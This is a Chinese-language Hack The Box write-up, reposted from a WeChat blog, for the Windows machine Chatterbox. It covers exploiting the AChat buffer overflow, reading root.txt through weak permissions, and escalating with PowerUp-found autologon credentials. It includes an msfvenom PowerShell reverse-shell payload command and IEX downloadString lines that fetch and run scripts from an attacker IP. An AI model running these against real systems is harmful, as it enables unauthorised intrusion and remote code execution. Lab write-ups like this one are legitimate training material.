> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xS3E6vYLMNIB9ROlzkfy7g)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **65** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/ZZjkJlysPGgXiaEDdiaSrSYEZ8PUyRCDzLpYwnHC7gw6VXiaaToL2icZ3ia948IogXQ4lqoAMOD5LO2qOc5NHgZP6XA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/bdb9ZIwDgdDG2t7nibhXicZbsRPk5QZuwiactvdzLib1PfjRUlARjQlb4yZDxO03yRia6znvG144zcNh8e0ibgV2fMicA/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/123

靶机难度：中级（4.0/10）

靶机发布日期：2018 年 6 月 16 日

靶机描述：

Chatterbox is a fairly straightforward machine that requires basic exploit modification or Metasploit troubleshooting skills to complete.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/qZEn7rVYArv65UqUTxiaUf7ELEyoScH6cib0oGmVCQGhRNqcNUzb0ZdJpTKZW0tomEOozY8kicYlTljN42qPgOaCw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tnoEwRLFJ9dFjWplia590LSGmWZAxQxFfibbhE9WaG7W0Exorfrfib7c2CoNe73ge1fQQeFnsksA2mSHBA1mtut7g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/51TtUhVATLWEINNkACTTKZFJia5yamKT5AlfhvMGAgzs6z6hlgOxCdLrPHSWDYSI7ygXMSdq6ppXvkXQ8VRGicAA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/l8lTqQtyKedAibzUJia0K14RF6GPtnjHClibiaJXV948a2nYibEUOcczhkMhlNHlmmv7Kh1sw4uv0UAhgxd8b2lOwWg/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/PbVgOGtFTF5FY5e7u1KmDC7hyKS7QNCVgIuxQ6Qd2QWr1ic5sIbW6vWFkpuE4vHiaTMLHF5nkJib2HyYZXnSiaiayIw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTrygDE8XYneQVNerMtGyF35CQJN9N2FrIRsqRhKsCTJLHPwLzPHlYVtDQ/640?wx_fmt=png)可以看到靶机的 IP 是 10.10.10.74.....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTry9q05tpSCicgIBsJ1iaEZptPX5RqrHmofbvg0lbdsNoicCSXFZsECdnouw/640?wx_fmt=png)

nmap 发现运行了 9255http 的服务... 还发现存在缓冲区溢出漏洞...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTryzdgibUW7ohGDwzzuiaM7HicgDCricGt6iatwchwasPAfmpbWoOdgJNvYicPA/640?wx_fmt=png)

无法访问...400，回头发现运行了 Achat 服务器上...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTryIIfDgXwJzEB5P3ykuQhgA8QqWkmZ5BiawZDQoyMjOcic9O8UraY1JhQg/640?wx_fmt=png)

存在漏洞，有个 python 能利用... 试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTryseuH6miaHWib6GnVUJjZS1boQ0jXjkCdEstN0k7B75nrLqhtcuF8k32w/640?wx_fmt=png)

修改地址后...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTryCcx6YyaCY7AnH0ov06VTN6Iicbic5TOOSwI2CBoW7btwsDNCicxibsica6w/640?wx_fmt=png)

可以看到这是建立在 windows 系统上的缓冲区溢出... 这里可以利用 powershell 方向链接靶机...GO

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTryYvd4aMnOZicTh4fbcgj1fzc5pvoibI24Iaf6SRT9licyQJ0u5OOw0Lk5w/640?wx_fmt=png)

```
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=10.10.14.18 LPORT=6666 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

利用 achat 漏洞创建 windows 上 powershell 的反向 shell... 但是问题来了，可以看到 16974 bytes，Payload 3556，大于 1100 个字节就不能使用有效负荷了... 继续修改...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTryHwz1QibicHxtYZc5v4E1KmhRyp2wjTI5KYYtMHHWEs9ia1o4Q33ShvwBA/640?wx_fmt=png)

生成 MSFbuf...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTryicPJPOK4jc6gqGJFlEvia5ic49I1ydIUEYdPS71JzFUZC1AsJJL1ArI0g/640?wx_fmt=png)

准备好上传的 shell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTry1rbuMIicWN5vVGEqdic8kMYkIKxEy0N3QAx8MSngd54tSULyjHcmGSYQ/640?wx_fmt=png)

将 shell 填入即可....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTrypGPnIBCwJW2Z9B3X269Pl7icl9EnJ6RJXrshXWrOiccicRwK2wCv4JJbw/640?wx_fmt=png)

验证正常的...go

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTryYc5zqIrwnOI4NuibyXSkVYH7m4tv73LxsgEXrVSdSHVxib2QtqRuuZ5Q/640?wx_fmt=png)

通过 powershell 反向 shell 成功上传了... 获得了低权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTryIl49A7DkhVx99tW4GQOicicNoKKeYYhVrQOxodvMFibUVpjBHb3Qn4w4Q/640?wx_fmt=png)

获得 user.txt...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTryzhlYFV0LLLNsSCwJOYD0TP1RT150j4639s32rRtsEN3t6HAiaetGKOg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTryokstuFwKbwC7WKF3OAagZpCN7oHUZk3AnSic0icSLZGy7e0jltkAF0AQ/640?wx_fmt=png)

这里有点取巧了，目前我还在低权 Alfred 用户下，发现 administrator 下 desktop 的权限是可以看到 root.txt 文件的... 但是我进去查看内容无法查看... 看到我和 system 高权用户权限是一样的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTryp6c6ibc9hT7Bn8et94T4tjf7RTdVHZk6fLJiavx3icGMhbticH5l7BX1wA/640?wx_fmt=png)

可以看到，这里直接在低权用户利用 icacls 获得了 root 信息... 这是人员管理用户给权限的漏洞... （cacls  Windows 实用程序，用于查看 / 编辑文件权限）

虽然拿到了信息... 但是还是要讲述怎么拿到 system 权限的... 继续

目前具有 PowerShell 会话，可以使用 PowerUp 进行提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTryMJYltRd4icYd9RxSr0Yr57cRiaSeeXHLVg9s2srmibuh70Tsa7Keib8qNw/640?wx_fmt=png)

```
git cloun https://github.com/PowerShellMafia/PowerSploit
```

下载后上传使用即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTryqkMphVfialwajpAowpcJmCXLvF0qgicAHPIsbMcICib3nlia4N9yz9h05w/640?wx_fmt=png)

```
IEX(NEW-Object Net.webClient).downloadString('http://10.10.14.18/dayu.ps1')
```

因为在 powershell 下，直接上传...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTrytFPAm0fT40qibLHd218jhbxBlnjeoBMThd9hqeEcicITGubFogzhGX8Q/640?wx_fmt=png)

```
Invoke-AllChecks
```

可以看到利用 PowerUp 看到了隐藏在注册表中的一组自动登录凭据...

```
DefaultUserName      : Alfred
DefaultPassword      : Welcome1!
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTryhRmj80V0tdgA5lbMLic8dwdz0ZPos9BQgYdPM30qxicEpvOUkAUtlg3Q/640?wx_fmt=png)

这里创建一个凭据变量来存储密码... 就是告诉 PowerShell 将先前找到的密码存储在纯文本中，并强制将其保存...

然后创建一个名为 cred 的新变量，并将其用于登录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTryiatYSSNruo4g7KaBF8nhX5zociaXBQ8SDlkYQcPWZzWqxib2ZphZhVttw/640?wx_fmt=png)

直接在利用提权的 shell 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTryO1dFICNzAic838M6CU5UcFdI7D51ZH1QZTjyUK1BVuMiaRnx1mVpPbLA/640?wx_fmt=png)

```
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.18/dayushell.ps1')"  -Credential $cred
```

可以看到成功获得了 administrator 用户权限...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNewjwshhpALtZZt1yOxTrytq1KVHNycibZLEor5YL2GgaUy8EibhBBLqkFNlysPJ4JUWGxQ218ruJg/640?wx_fmt=png)

通过尝试使用 Administrator 帐户重用此密码是成功的，使用 powershell 或打开 SMB 并使用 impacket 的 psexec 来实现了... 完美

这里也能成功获得了 root 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/RKmmCHT73fdQQ2nv9rDeddIlJk71QWHcslefZEPQxvuVzXNn9ZlY6dicKOiaJQBXNFYkbHtUsOw0duN5FIUuItSA/640?wx_fmt=png)

这里介绍了几种方法，大家多多操作，加油！

当然，开局的时候官方的给的方法是：Chatterbox 是一台非常简单的机器，需要基本的漏洞利用修改或 Metasploit 故障排除技能才能完成。

我这里没使用 Metasploit 进行渗透的... 说明 Metasploit 肯定还有方式方法能进行提权.. 

这里有专研精神的，可以继续专研下去，这里可以利用 Metasploit 获得 root 信息...GO

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/xVzbJNmGHSCH5d0fX1bHZYbyKoFLsiapvaq5K6Oo80wFkVAmt04DEn4DSiagPY4oL5QTcTlFhJZsA5mbTUZTJFYQ/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)